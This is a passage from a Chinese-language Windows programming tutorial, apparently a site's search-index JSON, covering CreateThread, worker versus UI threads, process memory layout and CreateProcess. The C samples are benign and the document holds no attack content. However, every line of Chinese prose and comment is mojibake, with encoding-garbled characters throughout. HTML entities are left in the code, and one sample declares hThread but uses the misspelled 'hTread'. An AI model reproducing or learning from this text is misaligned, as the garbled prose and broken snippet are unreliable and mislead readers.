çº¿ç¨‹éœ€è¦çš„å‚æ•° [in] DWORD dwCreationFlags, // creation option åˆ›å»ºæ ‡å¿— [out, optional] LPDWORD lpThreadId // thread identifier outå‚æ•°ï¼Œè¿”å›çº¿ç¨‹ID); lpThreadAttributesï¼šæŒ‡å‘SECURITY_ATTRIBUTESå®‰å…¨å±æ€§ç»“æ„ä½“çš„æŒ‡é’ˆã€‚SECURITY_ATTRIBUTES.bInheritHandleæˆå‘˜å¯ä»¥æ ‡è¯†è¿™ä¸ªå¥æŸ„æ˜¯å¦å¯ä»¥è¢«ç»§æ‰¿ dwStackSizeï¼šçº¿ç¨‹åˆå§‹å †æ ˆçš„å¤§å°ã€‚ å¡«0å°±é»˜è®¤ä½¿ç”¨PEæ–‡ä»¶ä¸­æ ‡è¯†çš„å †æ ˆå¤§å° æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰å®ƒè‡ªå·±çš„å †æ ˆã€‚ä»¥å‰æˆ‘ä»¬å†™çš„ç¨‹åºåªæœ‰ä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œå°±æ˜¯ä¸€ä¸ªå †æ ˆã€‚ç°åœ¨å¤šåˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œä¸èƒ½å…±ç”¨è¦ä¸ä¼šä¹±ï¼Œæ‰€ä»¥æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å †æ ˆã€‚ lpStartAddressï¼šçº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°ä»£ç  lpParameterï¼šçº¿ç¨‹å‡½æ•°çš„å‚æ•°ã€‚ å¦‚æœè¦ç»™çº¿ç¨‹æ‰§è¡Œçš„å‡½æ•°ä¼ å‚æ•°ï¼Œé€šè¿‡è¿™ä¸ªå‚æ•°ä¼ ã€‚å¦‚æœçº¿ç¨‹ä¸­éœ€è¦ä½¿ç”¨çš„å‚æ•°è¾ƒå¤šï¼Œå¯ä»¥å°†å‚æ•°å°è£…åœ¨ç»“æ„ä½“ä¸­ï¼Œå°†ç»“æ„ä½“æŒ‡é’ˆä½œä¸ºçº¿ç¨‹å‚æ•°ã€‚ dwCreationFlagsï¼šåˆ›å»ºçº¿ç¨‹çš„æ ‡å¿—ã€‚ 0ï¼šåˆ›å»ºåé©¬ä¸Šæ‰§è¡Œ CREATE_SUSPENDEDï¼šæŒ‚èµ·ï¼Œç›´åˆ°æ‰§è¡ŒResumeThreadå‡½æ•°åæ¢å¤æ‰§è¡Œ lpThreadIdï¼šoutå‚æ•°ï¼Œè¿”å›çº¿ç¨‹ID çº¿ç¨‹é€šä¿¡ çº¿ç¨‹ä¹‹é—´çš„æ‰§è¡Œé¡ºåºæ˜¯ç”±æ“ä½œç³»ç»Ÿçš„è°ƒåº¦ç­–ç•¥å†³å®šçš„ï¼Œå› æ­¤æ‰“å°é¡ºåºæ˜¯æ— åºçš„ã€‚å¦‚æœéœ€è¦æ§åˆ¶ï¼Œè¿™æ¶‰åŠçº¿ç¨‹é€šä¿¡æ–¹é¢çš„çŸ¥è¯†ï¼Œåé¢è®² 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; // çº¿ç¨‹æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Thread: %d &quot;, i); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; // åˆ›å»ºçº¿ç¨‹ï¼Œä¸æ¥æ”¶è¿”å›å€¼ CreateThread( NULL, // lpThreadAttributes, çº¿ç¨‹å®‰å…¨å±æ€§ï¼ŒNULLè¡¨ç¤ºé»˜è®¤å®‰å…¨çº§åˆ« 0, // dwStackSize, çº¿ç¨‹å †æ ˆå¤§å°ï¼Œ0è¡¨ç¤ºé»˜è®¤å¤§å° ThreadProc, // lpStartAddress, çº¿ç¨‹å‡½æ•°çš„æŒ‡é’ˆ NULL, // lpParameter, ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // dwCreationFlags, çº¿ç¨‹åˆ›å»ºæ ‡å¿—ï¼Œ0è¡¨ç¤ºçº¿ç¨‹ç«‹å³è¿è¡Œ NULL // lpThreadId, è¿”å›çº¿ç¨‹IDçš„æŒ‡é’ˆï¼ŒNULLè¡¨ç¤ºä¸éœ€è¦ ); // ä¸»çº¿ç¨‹æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Main: %d &quot;, i); &#125; // å¯ä»¥ç­‰å¾…çº¿ç¨‹ç»“æŸï¼Œé˜²æ­¢ä¸»çº¿ç¨‹è¿‡æ—©é€€å‡ºå¯¼è‡´çœ‹ä¸åˆ°çº¿ç¨‹è¾“å‡º system(&quot;pause&quot;); return 0;&#125; çº¿ç¨‹å†…æ ¸å¯¹è±¡è¢«æ¸…ç†çš„ä¸¤ä¸ªæ¡ä»¶ çœ‹åˆ«äººçš„ä»£ç å¯èƒ½çœ‹åˆ°ä¸€åˆ›å»ºçº¿ç¨‹åå°±CloseHandleï¼Œå› ä¸ºçº¿ç¨‹å†…æ ¸å¯¹è±¡é‡Šæ”¾éœ€è¦ä¸¤ä¸ªå¿…è¦æ¡ä»¶ï¼š çº¿ç¨‹çš„ä»£ç æ‰§è¡Œå®Œæ¯•æˆ–çº¿ç¨‹è¢«ç»ˆç»“ çº¿ç¨‹å†…æ ¸å¯¹è±¡è®¡æ•°å™¨ä¸º0 æ‰€ä»¥ä¸€åˆ›å»ºçº¿ç¨‹åCloseHandleå…¶å®æ²¡å½±å“ï¼Œçº¿ç¨‹è¿˜åœ¨è·‘ã€‚ä½†å¦‚æœåç»­éœ€è¦è¿™ä¸ªçº¿ç¨‹å¥æŸ„æ¥æ“çºµè¿™ä¸ªçº¿ç¨‹ï¼Œå°±åˆ«é‚£ä¹ˆæ—©CloseHandleæ‰ 1234567891011HANDLE hThread;// åˆ›å»ºçº¿ç¨‹hTread = CreateThread( NULL, // lpThreadAttributes, çº¿ç¨‹å®‰å…¨å±æ€§ï¼ŒNULLè¡¨ç¤ºé»˜è®¤å®‰å…¨çº§åˆ« 0, // dwStackSize, çº¿ç¨‹å †æ ˆå¤§å°ï¼Œ0è¡¨ç¤ºé»˜è®¤å¤§å° ThreadProc, // lpStartAddress, çº¿ç¨‹å‡½æ•°çš„æŒ‡é’ˆ NULL, // lpParameter, ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // dwCreationFlags, çº¿ç¨‹åˆ›å»ºæ ‡å¿—ï¼Œ0è¡¨ç¤ºçº¿ç¨‹ç«‹å³è¿è¡Œ NULL // lpThreadId, è¿”å›çº¿ç¨‹IDçš„æŒ‡é’ˆï¼ŒNULLè¡¨ç¤ºä¸éœ€è¦);CloseHandle(hTread); çº¿ç¨‹å‡½æ•°å’Œå‚æ•°ä¼ é€’ çº¿ç¨‹å‡½æ•°åªæ˜¯å‘Šè¯‰æ“ä½œç³»ç»Ÿæ–°å»ºçš„çº¿ç¨‹æ‰§è¡Œçš„ä»£ç åœ¨å“ªï¼Œå®ƒçš„æ ¼å¼ä¸æ˜¯å¿…é¡»çš„ï¼Œå¼ºè½¬ä¸€ä¸‹ä»èƒ½ç¼–è¯‘é€šè¿‡ã€‚ ç¼–è¯‘é€šè¿‡12345678910111213141516171819202122232425262728293031323334353637#include &lt;windows.h&gt;#include &lt;stdio.h&gt;// æ”¹äº†å‡½æ•°è¿”å›ç±»å‹ï¼Œæ”¹äº†å‡½æ•°åVOID WINAPI MyThreadProc()&#123; // çº¿ç¨‹æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Thread: %d &quot;, i); &#125;&#125;int main(int argc, char *argv[])&#123; // åˆ›å»ºçº¿ç¨‹ï¼Œä¸æ¥æ”¶è¿”å›å€¼ CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)MyThreadProc, // å¼ºè½¬ NULL, 0, NULL); // ä¸»çº¿ç¨‹æ‰§è¡Œçš„ä»£ç  for (int i = 0; i &lt; 100; i++) &#123; Sleep(500); printf(&quot;Main: %d &quot;, i); &#125; // å¯ä»¥ç­‰å¾…çº¿ç¨‹ç»“æŸï¼Œé˜²æ­¢ä¸»çº¿ç¨‹è¿‡æ—©é€€å‡ºå¯¼è‡´çœ‹ä¸åˆ°çº¿ç¨‹è¾“å‡º system(&quot;pause&quot;); return 0;&#125; å‚æ•°å’Œçº¿ç¨‹å‡½æ•°çš„ç”Ÿå‘½å‘¨æœŸ å‘çº¿ç¨‹å‡½æ•°ä¼ é€’çš„å‚æ•°çš„ç”Ÿå‘½å‘¨æœŸå¿…é¡»æ¯”çº¿ç¨‹å‡½æ•°çš„ç”Ÿå‘½å‘¨æœŸé•¿ï¼Œå¦åˆ™è¿™ä¸ªå‚æ•°åœ¨å †æ ˆä¸­è¢«é”€æ¯äº†ï¼Œè€Œçº¿ç¨‹å‡½æ•°è¿˜åœ¨è·‘ï¼Œè¿™ä¼šå‡ºé”™çš„ã€‚æœ€å¥½å°†çº¿ç¨‹å‡½æ•°çš„å‚æ•°å®šä¹‰æˆå…¨å±€å˜é‡ï¼Œå…¨å±€å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ç¨‹åºè¿è¡Œæ—¶åˆ†é…ï¼Œç¨‹åºç»“æŸæ—¶é”€æ¯ï¼Œç”Ÿå‘½å‘¨æœŸå°±æ¯”çº¿ç¨‹å‡½æ•°é•¿ã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadProc(LPVOID lpParameter) &#123; int *pValue = (int *)lpParameter; // å°†ä¼ å…¥çš„å‚æ•°è½¬æ¢ä¸ºæ•´å‹æŒ‡é’ˆ for(int i = 0; i &lt; *pValue; i++) &#123; Sleep(100); printf(&quot;Thread: %d, Param: %d &quot;, i, *pValue); &#125; return 0;&#125;int main(int argc, char* argv[]) &#123; int threadParam = 123; // çº¿ç¨‹å‡½æ•°çš„å‚æ•° // åˆ›å»ºçº¿ç¨‹ï¼Œå¹¶ä¼ å…¥threadParamçš„åœ°å€ CreateThread( NULL, 0, ThreadProc, &amp;threadParam, // å°†threadParamçš„åœ°å€ä¼ é€’ç»™çº¿ç¨‹ 0, NULL ); for(int i = 0; i &lt; 100; i++) &#123; Sleep(150); printf(&quot;Main: %d &quot;, i); &#125; // ç­‰å¾…çº¿ç¨‹ç»“æŸï¼Œç¡®ä¿threadParamåœ¨ThreadProcç»“æŸå‰ä¸è¢«é”€æ¯ system(&quot;pause&quot;); return 0;&#125; UIçº¿ç¨‹å’Œå·¥ä½œçº¿ç¨‹ ç¤ºä¾‹è¯´æ˜ ç¨‹åºåŒ…å«ä¸€ä¸ªå¯¹è¯æ¡†ï¼Œè®¾æœ‰ä¸€ä¸ªç¼–è¾‘æ¡†å’Œä¸€ä¸ªå¼€å§‹æŒ‰é’®ã€‚ç¼–è¾‘æ¡†åˆå§‹æ˜¾ç¤ºå€¼ä¸º1000ã€‚å½“ç”¨æˆ·ç‚¹å‡»å¼€å§‹æŒ‰é’®æ—¶ï¼Œè¯¥å€¼æ¯ç§’è‡ªåŠ¨é€’å‡1ï¼Œç›´è‡³å‡è‡³0ã€‚ å®ç°ç»†èŠ‚ï¼šåˆ›å»ºwin32ç¨‹åºï¼Œæ–°å»ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œæ‹‰ä¸€ä¸ªç¼–è¾‘æ¡†ï¼Œæ‹‰ä¸€ä¸ªæŒ‰é’®ã€‚ç¼–è¾‘æ¡†çš„åˆå§‹å€¼è®¾ç½®ä¸º1000ã€‚å½“ç”¨æˆ·ç‚¹å‡»å¼€å§‹æŒ‰é’®æ—¶ï¼Œè°ƒç”¨StartCountdownå‡½æ•°é€æ­¥é€’å‡ç¼–è¾‘æ¡†ä¸­çš„å€¼ã€‚ä¸‹é¢æ˜¯å…³é”®çš„å®ç°ä»£ç ï¼š å¤šå­—èŠ‚å­—ç¬¦é›† å…³é—­SDL123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;windows.h&gt;#include &lt;stdio.h&gt; //sprintf#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);void StartCountdown(HWND hEdit);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_MYDIALOG), NULL, DialogProc); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) &#123; static HWND hEdit; switch (msg) &#123; case WM_INITDIALOG: hEdit = GetDlgItem(hwnd, IDC_COUNT_EDIT); SetWindowText(hEdit, TEXT(&quot;1000&quot;)); //è®¾ç½®ç¼–è¾‘æ¡†åˆå§‹æ˜¾ç¤ºçš„å€¼ä¸º1000 return TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDC_START_BUTTON) &#123; StartCountdown(hEdit); // Call the function when start button is pressed return TRUE; &#125; break; case WM_CLOSE: EndDialog(hwnd, 0); return TRUE; &#125; return FALSE;&#125;void StartCountdown(HWND hEdit) &#123; char buf[10] = &#123; 0 &#125;; int count; GetWindowText(hEdit, buf, 10); // ä»ç¼–è¾‘æ¡†è¯»å€¼ count = atoi(buf); // å­—ç¬¦è½¬æ•°å­— ////ç‚¹å‡»ä¸€æ¬¡å‡ä¸€æ¬¡ //sprintf(buf, &quot;%d&quot;, --count); //SetWindowText(hEdit, buf); // è‡ªåŠ¨é€’å‡è‡³0 while (count &gt; 0) &#123; sprintf(buf, &quot;%d&quot;, --count); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(hEdit, buf); // è®¾ç½®ç¼–è¾‘æ¡†çš„å€¼ Sleep(1000); // Wait for 1 second &#125;&#125; ç›¸å…³API1234567891011121314151617181920212223GetDlgItem(hDlg, IDC_EDIT_TIMER); //è·å–å­çª—å£å¥æŸ„GetWindowText(å¥æŸ„, æ•°æ®ç¼“å†²åŒº, é•¿åº¦); //ä»ç¼–è¾‘æ¡†è·å–æ–‡æœ¬sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); //å­—ç¬¦ä¸²è½¬æ•°å­—sprintf(æ•°æ®ç¼“å†²åŒº, &quot;%d&quot;, æ•°å­—); //æ•°å­—è½¬å­—ç¬¦ä¸²SetWindowText(å¥æŸ„, æ•°æ®ç¼“å­˜åŒº); //è®¾ç½®ç¼–è¾‘æ¡†æ–‡æœ¬----ä¾‹GetDlgItem(hDlg, IDC_EDIT_TIMER); //è·å–å­çª—å£å¥æŸ„TCHAR szBuffer[256]; // å‡è®¾è¶³å¤Ÿå¤§ä»¥å­˜å‚¨ç¼–è¾‘æ¡†å†…å®¹GetWindowText(hEdit, szBuffer, sizeof(szBuffer)); // ä»ç¼–è¾‘æ¡†è·å–æ–‡æœ¬int dwTimer;sscanf(szBuffer, &quot;%d&quot;, &amp;dwTimer); // å°†è·å–çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°sprintf(szBuffer, &quot;%d&quot;, dwTimer); // å°†æ•´æ•°æ ¼å¼åŒ–å›å­—ç¬¦ä¸²SetWindowText(hEdit, szBuffer); // æ›´æ–°ç¼–è¾‘æ¡†æ–‡æœ¬ é—®ï¼šå½“å¼€å§‹æŒ‰é’®è¢«ç‚¹ä¸‹åï¼Œçª—å£ç¨‹åºå¡æ­»äº†ï¼Œä¸ºä»€ä¹ˆï¼Ÿ ç­”æ¡ˆï¼šä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ã€‚æ²¡æœ‰æ–°å»ºçº¿ç¨‹ï¼Œåªæœ‰ä¸€ä¸ªä¸»çº¿ç¨‹ã€‚å½“å¼€å§‹æŒ‰é’®è¢«ç‚¹å‡»åï¼Œä¸»çº¿ç¨‹è¢«å ç”¨äºæ‰§è¡Œé€’å‡è®¡æ•°çš„ä»»åŠ¡ä¸­ã€‚ä¸»ç•Œé¢çš„GUIæ›´æ–°å’Œäº‹ä»¶å¤„ç†æ²¡æœ‰çº¿ç¨‹è·‘ï¼Œè¢«é˜»å¡äº†ã€‚å› æ­¤åœ¨æ‰§è¡Œé€’å‡è®¡æ•°æœŸé—´ï¼Œç•Œé¢å°†æ— æ³•å“åº”å…¶ä»–è¾“å…¥ï¼Œç•Œé¢ä¹Ÿæ— æ³•åˆ·æ–°é™¤ç¼–è¾‘æ¡†å¤–çš„å…¶ä»–éƒ¨åˆ†ã€‚è¿™è¡¨ç°ä¸ºåº”ç”¨ç¨‹åºâ€œå¡ä½â€ç›´åˆ°å¾ªç¯ç»“æŸã€‚ å»ºè®®ï¼šä¸è¦åœ¨ä¸»çº¿ç¨‹ï¼ˆä¹Ÿæ˜¯UIçº¿ç¨‹ï¼‰ä¸­å¤„ç†é€»è¾‘å¤æ‚çš„ä¸šåŠ¡ï¼Œå› ä¸ºè¿™ä¼šé˜»å¡ç”¨æˆ·ç•Œé¢çš„æ­£å¸¸å“åº”ã€‚å»ºè®®æ–°å¼€ä¸€ä¸ªçº¿ç¨‹å¤„ç†è¿™ç§è€—æ—¶æ“ä½œï¼Œä»è€Œé¿å…é˜»å¡UIçº¿ç¨‹ï¼Œè®©UIçº¿ç¨‹å¯ä»¥ä¿æŒå“åº”ï¼Œç»§ç»­å¤„ç†ç”¨æˆ·è¾“å…¥å’Œçª—å£åº“æ¶ˆæ¯ï¼Œä¿æŒåº”ç”¨ç¨‹åºç•Œé¢çš„å“åº”å’Œæµç•…æ€§ã€‚ æ–°å»ºçº¿ç¨‹æ¥æ‰§è¡ŒStartCountdownçš„äº‹ï¼Œè¿™æ ·ï¼ŒUIçº¿ç¨‹å¯ä»¥ä¿æŒå“åº”ç”¨æˆ·çš„è¾“å…¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;windows.h&gt;#include &lt;stdio.h&gt; //sprintf#include &quot;resource.h&quot;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);DWORD WINAPI StartCountdown(LPVOID lpParam);int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_MYDIALOG), NULL, DialogProc); return 0;&#125;BOOL CALLBACK DialogProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)&#123; static HWND hEdit; switch (msg) &#123; case WM_INITDIALOG: hEdit = GetDlgItem(hwnd, IDC_COUNT_EDIT); SetWindowText(hEdit, TEXT(&quot;1000&quot;)); //è®¾ç½®ç¼–è¾‘æ¡†åˆå§‹æ˜¾ç¤ºçš„å€¼ä¸º1000 return TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDC_START_BUTTON) &#123; HANDLE hThread = CreateThread(NULL, 0, StartCountdown, (LPVOID)hEdit, 0, NULL);// åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹æ¥å¤„ç†å€’è®¡æ—¶ï¼Œé˜²æ­¢UIå¡é¡¿ CloseHandle(hThread); return TRUE; &#125; break; case WM_CLOSE: EndDialog(hwnd, 0); return TRUE; &#125; return FALSE;&#125;DWORD WINAPI StartCountdown(LPVOID lpParam)&#123; HWND hEdit = (HWND)lpParam; char buf[10] = &#123; 0 &#125;; int count; GetWindowText(hEdit, buf, 10); // ä»ç¼–è¾‘æ¡†è¯»å€¼ count = atoi(buf); // å­—ç¬¦è½¬æ•°å­— ////ç‚¹å‡»ä¸€æ¬¡å‡ä¸€æ¬¡ //sprintf(buf, &quot;%d&quot;, --count); //SetWindowText(hEdit, buf); // è‡ªåŠ¨é€’å‡è‡³0 while (count &gt; 0) &#123; sprintf(buf, &quot;%d&quot;, --count); // æ•°å­—è½¬å­—ç¬¦ SetWindowText(hEdit, buf); // è®¾ç½®ç¼–è¾‘æ¡†çš„å€¼ Sleep(1000); // Wait for 1 second &#125; return 0;&#125; å°ç»“ åœ¨UIçº¿ç¨‹ä¸­é¿å…æ‰§è¡Œé˜»å¡æ“ä½œä»¥ä¿æŒç•Œé¢å“åº”ï¼Œå¤æ‚é€»è¾‘çš„æ“ä½œæ”¾åœ¨å•ç‹¬çš„å·¥ä½œçº¿ç¨‹ä¸­æ‰§è¡Œã€‚"},{"title":"åˆ›å»ºè¿›ç¨‹","path":"/wiki/Windows_API/åˆ›å»ºè¿›ç¨‹.html","content":"ä»€ä¹ˆæ˜¯è¿›ç¨‹ è¿›ç¨‹æ˜¯è¿è¡Œä¸­çš„ä¸€ä¸ªç¨‹åºã€‚ è¯¾å ‚ä¸Šçš„å®šä¹‰å’Œç†è§£ï¼šè¿›ç¨‹ä¸ºç¨‹åºæä¾›æ‰€éœ€è¦çš„èµ„æºï¼Œå¦‚æ•°æ®ã€ä»£ç ç­‰ã€‚è¿›ç¨‹æ˜¯ä¸€ä¸ªç©ºé—´ä¸Šçš„æ¦‚å¿µï¼Œå®ƒçš„è´£ä»»æ˜¯æä¾›èµ„æºï¼Œè‡³äºèµ„æºè¢«æ€ä¹ˆä½¿ç”¨ä¸å®ƒæ— å…³ã€‚ç±»æ¯”ï¼šè¿›ç¨‹æä¾›äº†ä¸€ä¸ªæˆ¿é—´ï¼Œæä¾›äº†æˆ¿é—´é‡Œçš„ä¸œè¥¿ã€‚è‡³äºæˆ¿é—´é‡Œçš„ä¸œè¥¿è¢«æ€ä¹ˆä½¿ç”¨ï¼Œæˆ¿é—´é‡Œçš„äººå¦‚ä½•èµ°æ¥èµ°å»ï¼Œé‚£æ˜¯çº¿ç¨‹ï¼Œä¸è¿›ç¨‹æ— å…³ã€‚ ä¾‹ ä½¿ç”¨ODæ‰“å¼€ä¸€ä¸ªè¿›ç¨‹ï¼Œç‚¹å‡»â€™Mâ€™æŒ‰é’®ï¼ŒæŸ¥çœ‹è¯¥è¿›ç¨‹çš„Memoryã€‚Memoryé‡Œå°±æ˜¯è¿›ç¨‹æä¾›çš„å†…å®¹ã€‚ æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰4GBçš„è™šæ‹Ÿç©ºé—´ï¼Œä½2Gæ˜¯å±äºè¯¥è¿›ç¨‹çš„ç”¨æˆ·ç©ºé—´ï¼Œé«˜2Gæ˜¯ç³»ç»Ÿå†…æ ¸ç”¨çš„ï¼Œé«˜2Gçš„ç©ºé—´æ˜¯æ‰€æœ‰è¿›ç¨‹å…±ç”¨çš„ã€‚ è¿›ç¨‹ä¹Ÿå¯ä»¥ç†è§£ä¸ºç”±ä¸€å †æ¨¡å—ç»„æˆçš„ï¼Œåœ¨ODç‚¹å‡»â€™Eâ€™æŒ‰é’®ï¼Œå¯ä»¥æŸ¥çœ‹è¯¥è¿›ç¨‹ä¸­æ‰€æœ‰çš„æ¨¡å—ã€‚æ¯ä¸€ä¸ªæ¨¡å—éƒ½æ˜¯ä¸€ä¸ªPEæ–‡ä»¶ï¼Œå®ƒä»¬éƒ½éµå®ˆPEæ–‡ä»¶ç»“æ„ï¼Œæ¯ä¸€ä¸ªPEæ–‡ä»¶å ç”¨ä¸€æ®µå†…å­˜ã€‚è¿™äº›æ¨¡å—ä¸ºç¨‹åºæä¾›äº†èµ„æºï¼šä»£ç å’Œæ•°æ®ã€‚ è¿›ç¨‹å†…å­˜ç©ºé—´çš„åœ°å€åˆ’åˆ† åœ°å€ï¼ˆx86 32ä½windowsï¼‰ åˆ†åŒº 0x00000000-0x0000FFFF ç©ºæŒ‡é’ˆèµ‹å€¼åŒº 0x00010000-0x7FFEFFFF ç”¨æˆ·æ¨¡å¼åŒº 0x7FFF0000-0x7FFFFFFF 64KBç¦å…¥åŒº 0x80000000-0xFFFFFFFF å†…æ ¸ 0x00000000-0x0000FFFFï¼šæ²¡æŒ‚ç‰©ç†é¡µã€‚ç”¨æˆ·ã€ç³»ç»Ÿéƒ½ä¸ä½¿ç”¨çš„åŒºåŸŸ 0x7FFF0000-0x7FFFFFFFï¼šæ²¡æŒ‚ç‰©ç†é¡µã€‚ç”¨æˆ·ã€ç³»ç»Ÿéƒ½ä¸ä½¿ç”¨çš„åŒºåŸŸ ä¹Ÿå°±æ˜¯è¯´ï¼Œä½2Gç©ºé—´çš„å‰é¢64KBå’Œå64KBï¼Œéƒ½æ²¡äººä½¿ç”¨ è¿›ç¨‹çš„åˆ›å»ºè¿‡ç¨‹ å½“åŒå‡»ç£ç›˜ä¸Šçš„ä¸€ä¸ªç¨‹åºæ—¶ï¼Œä¾¿åˆ›å»ºäº†ä¸€ä¸ªè¿›ç¨‹ã€‚ç¨‹åºæ˜¯å¦‚ä½•å˜ä¸ºè¿›ç¨‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿›ç¨‹çš„åˆ›å»ºè¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿ ä»»ä½•è¿›ç¨‹éƒ½æ˜¯åˆ«çš„è¿›ç¨‹åˆ›å»ºçš„ã€‚å½“æˆ‘ä»¬åœ¨Windowsä¸‹åŒå‡»ä¸€ä¸ªæ–‡ä»¶ï¼Œå®é™…ä¸Šéƒ½æ˜¯ç”±explore.exeè¿™ä¸ªè¿›ç¨‹è°ƒç”¨CreateProcesså‡½æ•°æ¥åˆ›å»ºæˆ‘ä»¬åŒå‡»æ–‡ä»¶çš„è¿›ç¨‹ã€‚ç³»ç»Ÿä¸­ç¬¬ä¸€ä¸ªè¿›ç¨‹æ˜¯ç”±æ“ä½œç³»ç»Ÿå†…æ ¸åˆ›å»ºçš„ã€‚ CreateProcessçš„æ‰§è¡Œè¿‡ç¨‹ å°†EXEæ–‡ä»¶æ˜ å°„åˆ°ä½2Gçš„ç©ºé—´ä¸­ PEæ–‡ä»¶ä¸­çš„å­—æ®µè¯´äº†åœ¨å“ªåŠ è½½ åœ¨é«˜2Gåˆ›å»ºè¯¥è¿›ç¨‹çš„å†…æ ¸å¯¹è±¡EPROCESS æ¯ä¸ªè¿›ç¨‹è¢«åˆ›å»ºï¼Œéƒ½è¦åœ¨å†…æ ¸ç©ºé—´åˆ›å»ºä¸€ä¸ªEPROCESS å°†ç³»ç»ŸDLLï¼ˆntdll.dllï¼‰æ˜ å°„åˆ°ä½2Gç©ºé—´ä¸­ åœ¨é«˜2Gåˆ›å»ºè¯¥è¿›ç¨‹çš„çº¿ç¨‹å†…æ ¸å¯¹è±¡ETHREAD è¿›ç¨‹æä¾›äº†ç©ºé—´ä¸Šçš„èµ„æºï¼Œè·‘èµ·æ¥è¦çº¿ç¨‹ã€‚ä¸€ä¸ªè¿›ç¨‹è‡³å°‘éœ€è¦ä¸€ä¸ªçº¿ç¨‹ï¼Œå®ƒæ‰èƒ½è·‘èµ·æ¥ ç³»ç»Ÿå¯åŠ¨çº¿ç¨‹ï¼š æ˜ å°„DLLï¼ˆntdll.LdrInitializeThunkï¼‰ æ ¹æ®exeè¾“å…¥è¡¨ä¸­æåˆ°è¿è¡Œæ—¶éœ€è¦åŠ è½½çš„é‚£äº›dllï¼ˆæ¯”å¦‚æœ‰A.dllï¼ŒB.dllï¼‰ï¼Œå°†è¿™äº›dllæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ã€‚A.dllä¹Ÿæœ‰è¾“å…¥è¡¨è¯´æˆ‘éœ€è¦åŠ è½½å…¶ä»–çš„dllï¼Œäºæ˜¯ä¹Ÿè¦æ˜ å°„A.dlléœ€è¦åŠ è½½çš„dllã€‚ç›´è‡³è¿™ä¸ªexeè¿è¡Œæ‰€éœ€è¦çš„æ‰€æœ‰dlléƒ½æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ã€‚ çº¿ç¨‹å¼€å§‹æ‰§è¡Œ ä½¿ç”¨CreateProcessåˆ›å»ºè¿›ç¨‹ æ³¨é‡ŠåŸç‰ˆ123456789101112BOOL CreateProcess( LPCWSTR lpApplicationName, // è¦å¯åŠ¨çš„ç¨‹åºåï¼ˆè¦å®Œæ•´æ–‡ä»¶è·¯å¾„ï¼‰ LPWSTR lpCommandLine, // å‘½ä»¤è¡Œå‚æ•° LPSECURITY_ATTRIBUTES lpProcessAttributes, // LPSECURITY_ATTRIBUTES lpThreadAttributes, // BOOL bInheritHandles, // DWORD dwCreationFlags, // LPVOID lpEnvironment, // LPCWSTR lpCurrentDirectory, // LPSTARTUPINFOW lpStartupInfo, // å¯åŠ¨ä¿¡æ¯ LPPROCESS_INFORMATION lpProcessInformation // OUTå‚æ•°ï¼Œä¼ å‡ºè¿›ç¨‹å’Œçº¿ç¨‹çš„ä¿¡æ¯);123456789101112BOOL CreateProcess( LPCTSTR lpApplicationName, // name of executable module LPTSTR lpCommandLine, // command line string LPSECURITY_ATTRIBUTES lpProcessAttributes, // SD LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD BOOL bInheritHandles, // handle inheritance option DWORD dwCreationFlags, // creation flags LPVOID lpEnvironment, // new environment block LPCTSTR lpCurrentDirectory, // current directory name LPSTARTUPINFO lpStartupInfo, // startup information LPPROCESS_INFORMATION lpProcessInformation // process information); STARTUPINFOW structureç»“æ„ä½“ï¼šSpecifies the window station, desktop, standard handles, and appearance of the main window for a process at creation 